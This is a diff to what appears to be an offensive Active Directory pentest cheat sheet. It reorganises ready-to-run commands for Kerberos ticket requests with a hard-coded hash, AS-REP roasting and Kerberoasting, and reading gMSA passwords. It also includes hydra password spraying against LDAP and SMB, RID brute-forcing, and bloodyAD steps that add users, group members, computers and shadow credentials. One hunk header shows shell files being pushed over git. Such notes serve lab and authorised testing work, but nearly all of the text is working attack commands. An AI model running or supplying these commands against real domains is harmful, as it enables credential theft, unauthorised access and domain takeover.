@@ -120,9 +120,11 @@ gobuster vhost --append-domain -u $DOM -k -r -t 30 --exclude-length 0 \
 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 
 # Exploitation
-## Initial Checks
+## Initial Enumeration
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
+nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
 sudo ntpdate -u $TARGET
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
@@ -349,25 +351,15 @@ git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f
 
 ## Infrastructure
 [*] Active Directory
-+---------- Clock skew ----------+
-sudo ntpdate -u $TARGET
-
-+---------- Set .ccache ----------+
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C; export KRB5CCNAME=`pwd`/$USERNAME.ccache
-
-+---------- Visualise LDAP ----------+
-godap $TARGET -d $DOM -t ldap/$DC -k
-
-+---------- Computer and User Information ----------+
++---------- Search ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306369)))" | grep -av 'nTSecurityDescriptor:' | tee out_users-info
 
-+---------- Get Commands ----------+
++---------- Get ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object MGTSVC$ --attr msDS-ManagedPassword
 
-+---------- Add Commands ----------+
++---------- Add ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'GROUP' 'USER'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add user 'myuser' '123qweasdF!'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add computer 'mypc' '123qweasdF!'
@@ -378,7 +370,7 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add shadowCredentials 'TARGET'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add add uac 'TARGET'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dnsRecord 'xxx.domain.example' '8.8.8.8'
 
-+---------- Check for Permissions ----------+
++---------- Permissions ----------+
 adminCount
 AllExtendedRights
 description
@@ -633,26 +625,9 @@ finger '$USERNAME'@$TARGET
 while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (88) Kerberos
-+---------- Clock skew ----------+
-sudo ntpdate -u $TARGET
-
-+---------- Domain Information ----------+
-nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
-
-+---------- Bloodhound Data ----------+
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
-
-bloodhound
-chromium http://127.0.0.1:8080
-MATCH (u:User) RETURN u
-
-+---------- Set .ccache ----------+
++---------- .ccache ----------+
 impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C; export KRB5CCNAME=`pwd`/$USERNAME.ccache
-
-+---------- Visualise LDAP ----------+
-godap $TARGET -d $DOM -t ldap/$DC -k
 
 +---------- Kerberos .ccache Negotiation ----------+
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
@@ -701,21 +676,8 @@ snmp-check $TARGET -c COMMUNITY_STRING -v 2c
 +---------- Spray Service ----------+
 (hydra -I ldap2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-+---------- Domain Information ----------+
-nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
-
-+---------- Bloodhound Data ----------+
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
-
-sudo neo4j start
-chromium "http://localhost:7474"
-bloodhound
-neo4j:neo4j
-neo4j:bloodhound
-MATCH (u:User) RETURN u
-
 +---------- Visualise LDAP ----------+
-godap $TARGET -d $DOM -t ldap/$DC -u '$USERNAME' -p '$PASSWORD'
+godap $TARGET -d $DOM -t ldap/$DC -k
 
 +---------- Domain SID ----------+
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --get-sid
@@ -732,16 +694,12 @@ nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-su
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --dc-list --query "(SAMAccountType=805306369)" "SAMAccountName"
 nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName" | awk '{print $6}' | grep '\$' > machines | sed 's/.$//' | tr '[:upper:]' '[:lower:]' > machines_pw; nxc smb $TARGET -u machines -p machines_pw | grep -oP '\[-\].*TRUST_ACCOUNT.*' | while read line; do echo -e "\e[1;33m$line <--- CHANGE PASSWORD NOW\!\e[0m"; done
 
-+---------- Browse with Godap ----------+
-godap $TARGET -u '$USERNAME' -p '$PASSWORD' -d '$DOM'
-
 [*] (445) SMB
 +---------- Spray Service ----------+
 (hydra -I smb://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 (hydra -I smb2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
 +---------- Get Shares, Users and Groups ----------+
-nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' >> usernames; cat usernames | sort -u | tee usernames; nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --groups | grep 'membercount' | cut -d':' -f1 | sed 's/^[^ ]* *[^ ]* *[^ ]* *[^ ]* *//' | sed 's/ *membercount.*//' >> groups
 
